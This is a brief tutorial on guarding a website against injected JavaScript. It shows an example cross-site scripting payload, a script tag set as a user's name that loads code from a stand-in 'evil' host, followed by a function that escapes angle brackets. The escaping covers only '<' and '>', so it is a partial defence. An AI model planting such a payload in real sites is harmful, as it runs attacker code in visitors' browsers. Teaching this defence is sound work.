# Protecting your Site from Other People's JavaScript

Imagine someone sets their name on your site equal to:

```HTML
<script src="http://hackyourwebsite.com/eviljavascript.js"></script>
```

They could mess up your site!

-

To prevent this you can add a function that prohibits the characters '<' and '>' from being entered by replacing them with different characters as seen below

```javascript
var charEscape = function(_html) {
    var newHTML = _html;

    newHTML = _html.replace(/</g, "&lt;");
    newHTML = newHTML.replace(/>/g, "&gt;");

    return newHTML;
};
```
